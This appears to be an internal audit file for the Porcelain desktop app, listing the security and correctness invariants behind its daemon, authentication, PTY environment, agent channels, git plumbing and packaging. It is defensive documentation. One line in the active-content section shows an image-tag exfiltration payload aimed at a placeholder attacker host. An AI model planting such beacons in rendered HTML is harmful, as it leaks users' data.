---
name: audit
metadata:
  internal: true
description: Porcelain's earned invariants — the security, correctness, performance, and packaging rules the codebase must never silently regress. Read before changing the main process, IPC, config, git plumbing, file reads, external URLs, packaging, or data-fetching wiring, and when reviewing a diff.
---

# Porcelain — invariants to preserve

Constraints the codebase **earned**: most were a bug, a crash, or a security gap before the fix
landed. Breaking one rarely fails a test; it fails in production. Read the invariant before touching
its area; verify it after. The `AGENTS.md` hard rules are assumed.

## Process boundary

- **External URLs go through `isSafeExternalUrl`** (`external-url.ts`; http/https/mailto allowlist).
  Every `shell.openExternal` / `setWindowOpenHandler` path is gated, or rendered content can run
  `file://` and custom-scheme URLs. Extend `ALLOWED_PROTOCOLS` deliberately; never drop the guard.
  *Verify:* lint-enforced, but the lint is a proxy — it can't tell a gated call from an ungated one
  *inside* a file that already imports the guard, so still read a change to `window.ts` itself.
- **`readFile` stats before it reads** and returns `{type:'too-large'}` above `MAX_READ_BYTES`
  (10 MB). Never read the bytes of an oversized file — a multi-GB file in a 50 GB monorepo OOMs the
  process.
- **`src/backend` is the only OS/git/fs surface.** `src/main` keeps the Electron-native rump
  (dialogs, windows, updater, plugin installer); the renderer is pure UI with no Node APIs, and
  `@main/*` imports there are **type-only** — a runtime import leaks Node into the bundle.
- **Never write into the user's work repos.** Per-repo state lives under `userData`, keyed by repo
  path.
- **Dev never opens or mutates real repos.** The dev stack uses `porcelain-dev` and a seeded
  playground; a managed worktree derives per-slug user data/channels and passes
  `PORCELAIN_DEV_PLAYGROUND` for its disposable playground. That override is a daemon-only knob and
  **must stay in `terminal-env.ts`'s scrub list**.

## The daemon is the ONE sanctioned listener — loopback-first, ALWAYS credential-gated

"The app opens no port" no longer holds, so the surface is deliberately hostile-input-hardened. All
of the following must stay true.

**(1) Binds are loopback plus, optionally, enumerated private interfaces behind the same gate.**
`listen(port, '127.0.0.1')` ALWAYS; on opt-in, second listener(s) on the detected Tailscale address
(100.64/10) OR the machine's RFC1918 addresses — both from the one `createIfaceListener` factory
sharing the same handlers, so the token gate applies unchanged. **Never `0.0.0.0`, never any other
interface.** Range alone was not enough: binding a Docker bridge address serves the daemon — and
therefore a shell — to every container on that bridge, so `findLanAddresses` also denies
virtual/container/VPN interface-name prefixes. That is a **deny** list because physical NIC names are
unenumerable and the range check already fail-closes on public addresses. `findTailscaleAddress`
refuses ambiguous multi-candidate setups (logs, returns null) rather than guessing, since the
100.64/10 match is range-based by design and non-Tailscale CGNAT interfaces exist. "Just bind
0.0.0.0 since we bind everything anyway" is wrong.
**Cleartext-credential-on-LAN is an accepted tradeoff:** the tailnet is WireGuard-encrypted, but on
a plain home LAN the bearer credential crosses the wire in cleartext and a sniffer can capture it —
accepted the way local dev tools accept it, but ONLY because the LAN bind is opt-in, default-off,
recorded here, and never silently widened past the enumerated private addresses.
**Tailscale Funnel is a proxy, not another listener:** public HTTPS exposure of loopback only by
explicit config/env/CLI action. `funnel.ts` must use `execFile` **without a shell**, refuse a nonempty
conflicting or unowned configuration, and turn Funnel off only when the 0600 Porcelain marker owns
this exact daemon target. Never adopt or erase another service's Funnel.

**(2) Auth is never optional.** Every `/trpc` request needs `authorization: Bearer <credential>`
(constant-time compare over sha256 digests, else 401); the WS upgrade needs the
`porcelain.<credential>` subprotocol or the handshake is rejected. *Why:* loopback is reachable from
any webpage the user's browser has open, and **WebSockets carry no CORS at all**, so an
unauthenticated `/session` hands `terminal:create` — a shell — to drive-by web content. The token gate
is the whole boundary: a holder can already open/read any path, so the daemon-side `browseDirs`
(directory names only) widens nothing.

**(2b) Two credential scopes, one gate.** `authenticate()` accepts the local administrator credential
(`~/.porcelain/admin-token`, 0600) or a client token whose sha256 hash is in `access.json` (0600). The
plaintext administrator credential only reaches the local Electron renderer and host CLI.
Access/network/Funnel procedures use `adminProcedure` — never make them ordinary client procedures.
Revoking a client removes its hash **and closes that client's live WS sessions**: the gate runs at
upgrade time, so removing the stored hash alone is insufficient. *Verify:* `admin-token.test.ts`,
`access-store.test.ts`, `daemon-http.test.ts`.

**(3) No credential appears in argv** (`ps`-visible), daemon logs/stdout (the only stdout line is the
port), or a spawned PTY's env. A connection link carries the one-time secret **only in the URL
fragment**, which browsers never send on GET — never move it to the query or path, never log or render
it beyond the explicit copy surface. Saved environments store client tokens in plaintext under
`userData` (a user-owned directory), tokens are stripped from renderer query results, and a token is
sent only to a verified endpoint of its own entry.
**The administrator token that DOES reach the renderer is the LOCAL daemon's**, handed to remote-bound
windows too so they can open a second connection to the machine the app runs on. Safe for one reason
worth keeping: an Electron window always loads our own renderer dist from disk (`loadFile`,
`will-navigate` guarded), so a remote-bound window runs trusted code — a remote daemon never serves it
HTML. **If a window is ever loaded FROM a remote daemon's static server, this becomes a real
credential leak and must go first.** It stays Electron-only (the shell router throws in the browser).
**An entry must never come to hold two different machines' addresses** — that is what would put one
machine's token on another's wire, in cleartext, on a LAN. Two guards, both required: the identity
merge requires the existing entry's credential to authenticate at the new address (reported hostnames
like `ubuntu` collide without malice), and `addEnvironmentEndpoint` rejects an address whose daemon
reports a different host. A duplicate entry is cosmetic; a merged pair of machines is a leaked
credential.

**(4) CORS is scoped, never `*`** — only the dev Vite origin or the packaged `null` origin is echoed.
The preflight carries nothing sensitive; the Bearer check on the real request is the gate.

**(5) Static serving widens nothing.** Non-`/trpc`, non-`/session` requests get the renderer dist —
**GET/HEAD only, unauthenticated by design** (the app shell is not secret). It must stay this narrow:
it only reads files INSIDE the dist root (`resolveStaticPath` decodes, normalizes, and rejects
traversal, encoded `%2e%2e`, absolute paths, backslashes — unit-tested), never reads user files, adds
**no write surface**.
**(5b) Pairing is the one narrow unauthenticated mutation.** `POST /pair` accepts only an ≤8 KB JSON
body, is rate-limited per remote address, and atomically consumes a 15-minute single-use grant;
plaintext pair/client secrets are never stored. Do not add another unauthenticated dynamic route or
broaden this exchange. `rewriteCsp` touches **only `connect-src`**. The rewritten shell MUST stay
`no-cache` (host-specific, pointing at release-hashed assets); only fingerprinted `/assets/*` may be
`immutable`, and compressed variants keep `Vary: Accept-Encoding`. Don't relax any of this to "make
local dev easier."

**(6) A client credential is the user boundary across every network — accepted.** A peer presenting
one gets everything loopback gets: arbitrary-path `readFile`/`writeTextFile`/`renamePath`/`trashPath`
and `terminal:create`. That's the design — the token holder IS the user. Consequences: the token file
and the saved-environments file are exactly as sensitive as user-level shell access on the daemon
host; a token sniffed off a LAN grants a shell; the second-listener binds must never widen beyond
their enumerated addresses. Funnel is intentionally public HTTPS, so possession of a device credential
is its entire product boundary. Keep admin-only procedures separate, but **do not repo-scope ordinary
file procedures** — that breaks cross-repo flows.

*Verify:* `rg -n "createServer|listen\(|http\.createServer" src/backend src/main src/cli` hits at most
two `createServer` sites (`server.ts`, `tailnet-listener.ts`) and nothing in `src/cli`; the loopback
`listen` still passes `'127.0.0.1'`; the factory binds only `findTailscaleAddress()`/
`findLanAddresses()` results; all listeners share the Bearer + subprotocol checks;
`static-server.test.ts` traversal and connect-src-only tests stay green.

## PTY environment

- **A spawned PTY's env is scrubbed of the daemon's internals** (`terminalEnv` in `terminal-env.ts`,
  unit-tested — extracted from the one impure module precisely so the strip list is testable).
  `DAEMON_ONLY_ENV` must cover: `PORCELAIN_ADMIN_TOKEN` (a secret — `env` would print it),
  `PORCELAIN_ADMIN_TOKEN_FILE`, `PORCELAIN_ACCESS_FILE`, Funnel controls, the other daemon-only
  `PORCELAIN_*` knobs, `ELECTRON_RUN_AS_NODE` (would make any Electron binary launched from the
  terminal silently run as plain Node), and **`_VOLTA_TOOL_RECURSION`** — Volta's shim sets it on the
  real node process when the daemon starts via `~/.volta/bin/node`, and if it leaks every
  `node`/`yarn`/`npm` shim thinks it is a recursive tool call, skips the managed platform, and fails
  with "Node is not available"/ENOENT (VS Code works because its PTY host never has the flag). The
  user's real environment otherwise passes through untouched. *Verify:* a new daemon env var that must
  not leak is added to `DAEMON_ONLY_ENV`; `terminal-env.test.ts` still asserts the token,
  `RUN_AS_NODE`, and `_VOLTA_TOOL_RECURSION` are absent.

## The agent CLI and its channels

- **The CLI adds NO inbound network surface.** `src/cli/` is a short-lived process the user's agent
  runs per command; it never opens a port or socket, only reads/writes local `~/.porcelain/*.json`.
  Don't "upgrade" a channel to an in-app HTTP listener or a long-lived agent server. It stays
  **dependency-free** (Node builtins only) so it runs under a plain `node` — no npm imports in
  `src/cli/`.
- **Rules common to every channel:** both sides write **atomically** (tmp + rename), the app serializes
  its own read-modify-write, content is local-file only, and a malformed entry is **dropped, not
  thrown** (read-side leniency — one bad agent write must never break a surface). Externally-authored
  *paths* are repo-contained on read; externally-authored *regex* is compile-checked on read.

| Channel | Direction | Rule specific to it |
|---|---|---|
| `review-sets.json` | agent authors | The app makes exactly **ONE** write — `clearReviewSet`, user-initiated, deleting a repo's entry. Don't add another. Re-validated with zod on every read because an external process owns it |
| `comments.json` | two-way | The **app** authors comments, so their `path`s are app-supplied and need no containment guard; the CLI only reads and flips `resolved`. A race with a CLI resolve is rare and low-stakes (the watcher re-syncs). Don't add an app-side write that accepts an agent-supplied path |
| `board.json` | two-way | Content is card text — not paths, not commands |
| `actions.json` | two-way | Content is a **shell command** — see below |
| `layers.json` | two-way | Content is **auto-executed regex** — see below |
| `notes.json` | app→agent | App is **sole writer**; CLI has only `notes get`. **No notes-write command** — notes are the human's; captured tasks belong on the board. **No watcher** — nothing pushes back |
| `reviewed.json` | app→agent | App is sole writer; CLI has only `reviewed list`. No mark-write command — "reviewed" is the human's act. No watcher |
| `feature-view.json` | app→agent | App is sole writer; no write command — the snapshot is **derived, not authored**. No watcher. It refreshes only while the Feature surfaces poll, so treat it as "the view as last rendered", never source of truth |
| `scope.json` | two-way | Monorepo hide/pin; watch emits `scope` → tree/pins/search invalidate |

  These live in `~/.porcelain` rather than `userData/config.json` for one reason: **the
  dependency-free CLI must read them off disk.**

- **Review-set paths are repo-contained on read — files AND section anchors.** `readReviewSet` drops
  any FILE whose path is absolute or escapes `repoPath` and filters every SECTION's `anchors` the same
  way, because both flow into `readFile(join(repoPath, path))`. Without it an injected review set reads
  arbitrary local files into the Review. *Verify:* new code reading an agent-supplied path routes
  through the filtered set.
- **Saved actions are agent-writable but HUMAN-executed.** An agent that writes `actions.json` could
  plant a command; three safeguards make that acceptable and all must hold: (1) **nothing in the agent
  channel executes an action** — the CLI has `list/create/update/delete` and **no run verb**; running
  is solely a human click. (2) The **full command text is always visible** in the Actions row before
  the click — never hide or truncate-without-recourse. (3) It runs in a **visible PTY** via the user's
  login shell, so there is no silent background execution. *Verify:* the CLI command table has no
  execute verb; the Action row still shows `command`.
- **Flow layers are auto-executed regex.** `compileLayers` runs `new RegExp(pattern, 'g')` on every
  flow build, so **the app's read MUST drop any layer whose pattern doesn't compile** or one bad
  agent-written pattern throws and breaks every grouping view; the CLI rejects an uncompilable pattern
  up front. Patterns run against short repo-relative paths and the human can already type any regex in
  Settings, so the ReDoS surface is unchanged — **don't add a bespoke complexity guard the human path
  lacks**; keep the compile-on-read filter. *Verify:* a CLI-written invalid pattern is dropped, not
  thrown, on the next flow poll.
- **Reviewed marks reconcile at read time.** Each mark is keyed to a content fingerprint (sha256 of the
  file's diff vs HEAD); `reconcileReviewed` prunes a mark whose fingerprint no longer matches and
  writes through, so the JSON stays truthful for the CLI. This is what clears marks after external
  commits, amends, rebases, and post-mark edits — the `gitCommit` clearing is only a fast path. An
  empty fingerprint never matches, so it prunes on first reconcile.

## Agent-authored active content

- **Review-section diagrams and HTML embeds are ACTIVE content — render them ONLY in a fully sandboxed
  iframe; prose and thesis render as escaped markdown.** An external process owns `review-sets.json`,
  so all of these must hold:
  1. A section's `diagram` (executable SVG) and its `html` embed render only inside the existing
     `<iframe sandbox="" srcdoc>` path — the **EMPTY** sandbox attribute: no `allow-scripts`, no
     `allow-same-origin`, no `allow-popups`, ever. Never `dangerouslySetInnerHTML`, never add an
     `allow-*` token, never swap to a `src` URL.
  2. `prose`/`thesis` go through **react-markdown with default escaping — NO `rehype-raw`**, so a
     `<script>` or `<img>` in prose is shown as text.
  3. **The parent CSP is the only thing blocking external subresource loads.** A `srcdoc` document
     inherits it and **sandbox alone does not block passive loads**, so `default-src 'self';
     img-src 'self' data:` is the real backstop against an HTML-only exfil channel
     (`<img src="https://attacker/?leak=...">`) inside a diagram or evidence body. **Never widen
     `img-src`/`default-src`** while any agent-authored HTML can render, and keep the browser-client
     `rewriteCsp` **connect-src-only**. The Electron `connect-src` also allows scheme-wide
     `http:/https:/ws:/wss:` so a remote daemon is reachable — deliberate, and it must not creep into
     the other directives. `font-src 'self' data:` is deliberate (Vite inlines small font subsets as
     data URIs, which the `default-src` fallback would block); a `data:` font is inert, but **never add
     a REMOTE host to `font-src`** — a remote font load IS a beacon.
  4. Anchor paths are repo-contained on read, and the caps (`max` on sections/prose/diagram/html/
     htmlHeight/anchors) are enforced by the whole-file zod parse; a failing section is dropped, never
     thrown.
  5. The app's ONLY write to `review-sets.json` remains `clearReviewSet` — thesis and sections are never
     app-authored.

  *Verify:* the diagram and evidence iframes keep `sandbox=""` with no allow-tokens; prose renders
  without `rehype-raw`; the CSP is byte-unchanged.
- **Loop evidence is directory-on-disk, not an inline HTML payload** —
  `loop-evidence/<sha256(repoPath)[0..16]>/` with `index.html`, sibling screenshots, optional
  `meta.json`. Agents write those with normal Write tools; `evidence prepare` takes **title only** and
  returns the path, because **large base64 through a channel arg is the failure mode this designed
  out**. The app inlines relative `img` src under that dir into data URIs for the sandboxed viewer, and
  the sandbox clause above governs the HTML body. **Structured checks render natively** — plain React
  with the agent-authored label/detail as **escaped text**, not through the iframe — so they add no
  active-content surface; they are bounded on read (≤32 checks, label ≤120, detail ≤400) and a
  malformed entry is dropped, not thrown. Overall status is **DERIVED, never stored**
  (`evidenceOverallStatus`: any fail → fail, else any pass → pass, else null). The cap is a deliberate
  **split** — read-side `MAX_HTML_BYTES` 4 MB for inlined-screenshot headroom, CLI write cap 1.5 MB.
  **Over-cap is not "cleared":** `readEvidence` still returns title/checks/dir with `htmlUnavailable`,
  so the UI says "Evidence too large", never the cleared empty state. `updatedAt` is the later of
  `meta.updatedAt` and `index.html` mtime, so in-place agent edits invalidate without a re-`evidence
  check`. *Verify:* `evidence-store.test.ts` (too-large + mtime); `evidence prepare` returns a path
  without requiring html; overall status is computed, never read from disk.
- **`evidence set` still accepts `--html` (inline or `-` for stdin) OR `--html-file`** (absolute path) —
  but the directory flow above is preferred so large HTML never rides a channel arg.

## CLI install

- **Boot-driven, writes ONLY to `~/.porcelain`, takes no user input.** `ensureCli` copies the bundled
  CLI into `~/.porcelain` and writes + chmods (0755) the `porcelain` sh wrapper. No user string reaches
  a path or command, and **no per-agent config files are written** — agents just run the binary, so
  there is nothing to register (the old writes into agent-host config files, and their
  file-mode-preservation trap, are gone). It runs at **every app boot AND every daemon boot**
  (best-effort on both), so an app *or* standalone/remote daemon upgrade ships the current CLI with no
  Settings step — without the daemon path a remote host kept a stale binary forever. Writes are atomic
  and create the parent dir. `git`'s `execFile` (no shell) remains the pattern for the git surface.
  *Verify:* `ensureCli` is called at app boot *and* daemon `main()`; no code writes into agent-host
  config files.

## Config persistence

- **All config writes go through `createHomeChannel`**: atomic tmp+rename, corrupt files backed up to
  `.corrupt-*`, and `updateConfig(mutate)` serializing read-modify-write. **Never reintroduce a bare
  load→mutate→save pair** — concurrent mutations dropped writes and a crash mid-write corrupted
  `config.json`. Read-only callers may use `loadConfig`.
- **Hidden-path filtering happens in the MAIN process** (`visibleFilePaths`, tested), not the renderer —
  the renderer must never receive paths the user hid.

## Git plumbing

- **The pre-commit verification process clears Git's hook-local environment.** Git exports repository
  variables such as `GIT_INDEX_FILE` to hooks, so before `pnpm verify` `.husky/pre-commit` must
  enumerate `git rev-parse --local-env-vars` and unset each one. Otherwise tests that create temporary
  Git repositories inherit the real worktree's index and object paths, ignore their `cwd`, and can
  create fixture commits or switch branches in the checkout being committed. The branch/profile checks
  intentionally run **before** the scrub; verification runs after. *Verify:* `lint-audit` enforces the
  scrub, and a normal commit completes without changing branch or producing fixture commits.
- **`cwd` decides which repository a spawned git acts on — never an inherited variable.** Every git
  spawn builds its env with `gitEnv`, which drops the repository-local variables
  `git rev-parse --local-env-vars` names and passes the rest through: `GIT_SSH_COMMAND`/`GIT_ASKPASS`
  say HOW git works, not WHICH repo, and stripping them would break push auth. This is the runtime half
  of the hook scrub, and it is what makes the property hold for callers that never went through the
  hook (CI, a terminal that exported `GIT_DIR`, a daemon started from a hook). **The failure is silent
  and total:** a fixture `git init --bare` once inherited a hook's `GIT_DIR`, reinitialized the real
  checkout as bare (`core.bare=true`, so Porcelain rendered the primary worktree as `(detached)`) and
  wrote fixture commits onto the task branch. The test helper in `git.test.ts` scrubs for the same
  reason — a fixture repo must be immune on its own, whoever spawned the tests. *Verify:* lint-enforced
  (every gateway spawn passes `env: gitEnv(`); `git-env.test.ts` pins the strip list; `git.test.ts` →
  "inherited repository env" runs a fixture under a decoy `GIT_DIR` and asserts the decoy keeps its
  HEAD, branches, index, and `core.bare=false`.
- **Every git invocation sets `GIT_OPTIONAL_LOCKS=0`** (`runGit`). The 3s `gitStatus`/`gitFlow`
  background polls otherwise rewrite `.git/index` under a lock, racing the user's own `pull`/`commit`
  and failing it with `fatal: Unable to write index.`. The flag disables only optional refreshes;
  required locks for real mutations are untouched. *Verify:* lint-enforced — the flag stays in `git.ts`
  and no other shipped `src/backend`/`src/main` module spawns `git` around `runGit`. Tests and
  `src/cli`'s one-shot `rev-parse` are out of scope on purpose (neither polls a live user repo).
  `git.ts` itself is exempt from the spawn half, so a new in-file bypass of `runGit` is invisible to
  the lint — still read a change to `git.ts`.
- **Commit never auto-stages.** `gitCommit` is `git commit -m` on **staged** changes only; staging is
  explicit. Porcelain is a review tool — a silent `git add -A` on commit is surprising.
- **Quick commands run a whitelist** (`QUICK_COMMANDS`), never arbitrary shell. New quick actions are
  added to the whitelist, not passed through.
- **Status listings use `-uall`** in `gitStatus` and `gitDiffFile`'s status probe. The default
  `-unormal` collapses an untracked directory into one `dir/` row; that row reaches the Changes list,
  and `gitDiffFile` then `readFile`s a directory → `EISDIR` (blank tab + error). *Verify:* new
  `git status` calls feeding the changes list keep the flag.

## Data fetching & IPC

- **Data fetching = tRPC v11 + @tanstack/react-query v5 over TWO transports.** (1) The **appRouter** is
  real tRPC over `httpBatchLink` to the daemon; its streams and push ride the ONE zod-validated WS
  session, where terminals and watch registration are **messages, not procedures**. (2) The
  **shellRouter** rides a serialized-HTTP shuttle over `invoke('trpc-shell')` replayed through
  `fetchRequestHandler`: **keep all protocol logic inside tRPC — only shuttle bytes.** Don't
  reintroduce a transport that reads tRPC internals; that is what rotted `electron-trpc` (abandoned at
  0.7.1, never supported v11). Shell push is the `shell-event` IPC channel; daemon push is the WS
  session. **Neither is a tRPC subscription — there are none.** Never raw `ipcMain`/`ipcRenderer` for
  data; never cast.
- **Components never import `@renderer/lib/trpc` or `@renderer/lib/daemon`** (Biome
  `noRestrictedImports` on `components/**`). Server access goes through domain hooks that own their
  post-mutation invalidation; the WS session is reached only through `use-app-events` /
  `use-terminal-channel` / `use-files`. The vanilla tRPC client is sanctioned only in `stores/repo.ts`
  and `use-app-events.ts`.
- **Never `void` a promise** to silence a floating-promise lint — use `async`/`await` or
  `await Promise.all([...])`.
- **The shell forks the daemon via `utilityProcess.fork` — NEVER via `spawn(process.execPath, …,
  ELECTRON_RUN_AS_NODE)`.** Packaged builds fuse `RunAsNode` OFF and **the fuse silently IGNORES the
  env var**, so a child_process spawn boots the child as a second full GUI app whose own
  `startDaemon()` spawns another — a recursive fork bomb, caught only in a pre-publish fuse check
  because dev and e2e run unfused. `utilityProcess` runs a real Node environment regardless of the
  fuse, and node-pty's Electron-ABI build stays valid. Lifecycle differs from child_process: only
  `spawn`/`exit` events exist (**no `error`**), so every way down lands on `exit` — `onChildDown` and
  `awaitReadyLine`'s reject both key off it, with `wentDown`/`cleanup` flags guarding a double signal.
  The shell also sets `PORCELAIN_NO_STDIN_WATCHDOG=1` (a utility child has no stdin). *Verify:*
  `kill -9` the daemon while the app runs → it restarts and the UI recovers; in a packaged build
  exactly ONE process has `daemon/server.js` in argv.
- **On WS-session close, DETACH senders (PTYs survive) — but still reject every in-flight and queued
  terminal create AND attach, and clear the outbox** (`session.dispose` → `detachSender`, **not** a
  kill). A PTY's lifetime is decoupled from the connection, so a dropped socket must not end a shell —
  but a `createTerminal`/`attachTerminal` promise whose reply died with the socket would hang forever,
  and replaying a stale `terminal:create` from the outbox on a much-later reconnect would spawn an
  abandoned shell nobody awaits. Reconnect DOES re-register watch sets, re-attach every streamed
  terminal, and flush the outbox on a *live* open — but pending creates/attaches are rejected, not
  replayed (attaches drop their id so the next hydrate retries). **Don't make creates auto-replay and
  don't reintroduce a kill-on-close path.**
- **A session's scrollback is byte-capped (64 KB).** Attach replays retained output into the
  reconnecting client's xterm, so it must be remembered — but a chatty long-running shell would grow
  daemon memory without bound. Newest ≤64 KB kept, oldest dropped. Don't remove or unbound the cap.
  *Verify:* `scrollback-buffer.test.ts`.

## Performance (must stay fast on a 50 GB monorepo)

- **Never render all lines of a file.** Viewer and diffs go through `VirtualRows`; Shiki tokenizes only
  mounted rows.
- **Never index what isn't visible.** The file tree is lazy per-directory `readDir` on expand; nothing
  is indexed up front. `git ls-files` is cached stale-while-revalidate.
- **`optimizeDeps.entries` must cover `src/**/*.{ts,tsx}`** so every `@base-ui/react/*` entry is
  pre-bundled — a dep discovered lazily mid-session re-optimizes, loads a second React copy, and
  crashes with "Invalid hook call".
- **Git queries are live, fs queries are cached.** `gitFlow` (staleTime 0 + 3s poll) and `gitDiffFile`
  (staleTime 0) must reflect the working tree; fs-backed queries keep the 30s default. The 3s poll is
  cheap **only** because the daemon memoizes flow on a status+numstat+layers key — don't break that key.
- **Open file documents stay fresh by a WATCHER, not by polling `readFile`.** A `refetchInterval` would
  re-read every open file on a timer and throw away the 30s cache. Instead the renderer pushes its open
  file-tab paths and the daemon watches just **those files' directories**, emitting `working-tree`.
  *Why dirs, not the tree:* a recursive watch on a 50 GB repo is the thing this rule exists to avoid,
  and it would drown in `.git`/`node_modules` churn; watching open files' dirs (filtered by basename,
  surviving tmp+rename) is O(open tabs). Don't upgrade it to a recursive watch, don't make `readFile`
  poll.
- **The Files tree stays fresh by a WATCHER, not by polling `readDir`.** Same shape: the renderer pushes
  currently-**expanded** dir paths and the daemon puts ONE non-recursive `fs.watch` on each, emitting a
  window-targeted `file-tree` event. This stays O(expanded dirs): **`.git` events are dropped** (index
  churn must not spam refetches), watchers are **capped per sender** (extras fall back to the 3s-stale
  tab switch), and bursts are **debounced** into one send. It must never become a recursive tree watch,
  and `readDir` must keep its 30s cache. Watchers are reaped on window close.

## Packaging

- **Main/preload deps stay in `dependencies`; renderer-only libs in `devDependencies`.** electron-vite
  externalizes main/preload imports and electron-builder copies them *whole* into `app.asar`; Vite
  bundles renderer libs regardless of section. Misplacing a dep either bloats the bundle (a ~100 MB
  regression) or breaks the packaged app at runtime.
- **Never map an empty `CSC_LINK` into the release env.** A defined-but-empty value makes
  electron-builder attempt signing and die with `<projectDir> not a file` — set it real or omit it.
- **`node-pty` is the lone native module — keep it unpacked, rebuilt, and signed.** It loads in the main
  process, so it stays in `dependencies`, is rebuilt for Electron's ABI by
  `electron-builder install-app-deps` (and listed in `onlyBuiltDependencies` so pnpm allows its build),
  and is `asarUnpack`ed. **Both `pty.node` AND the `spawn-helper` binary it `exec`s** must live on disk
  outside `app.asar` and be code-signed/notarized, or the packaged terminal can't spawn (a PTY fails, or
  notarization rejects an unsigned Mach-O). *Verify:* a packaged build's
  `Resources/app.asar.unpacked/node_modules/node-pty` exists and the terminal opens.
- **`trash` joins node-pty in `asarUnpack` AND patches its helper URL.** It `exec`s platform helper
  binaries, and a helper packed inside `app.asar` can't be executed. Unpacking alone is insufficient:
  `trash` derives the helper URL from its module inside `app.asar` and `execFile` fails with
  `spawn ENOTDIR` unless that URL is redirected to the sibling `app.asar.unpacked` — the pinned pnpm
  patch performs only that segment rewrite, leaving plain-Node and non-ASAR installs unchanged. The main
  bundles are CJS while `trash` is ESM-only, so `electron.vite.config.ts` sets `output.interop: 'auto'`;
  without it the `require` returns a namespace object and every daemon trash call throws "trash is not a
  function" — it slipped through the unit gate because only e2e exercises a real daemon trash. **Don't
  drop the interop setting.** *Verify:* `node_modules/trash/**` is in `asarUnpack` and
  `trash-packaging.test.ts` passes.

## How to verify

`pnpm verify` is the gate before any commit (hard rule 3). Three rules above are lint-enforced by
`scripts/lint-audit.mjs` — the `isSafeExternalUrl` gate, `GIT_OPTIONAL_LOCKS=0`, and the hook env scrub
— so they fail `pnpm lint`, not a review. Everything else (dep placement, IPC shape, read limits, the
bind rules, channel write safety, packaging) needs a human or agent read of the diff. When reviewing,
walk this list against the changed files.
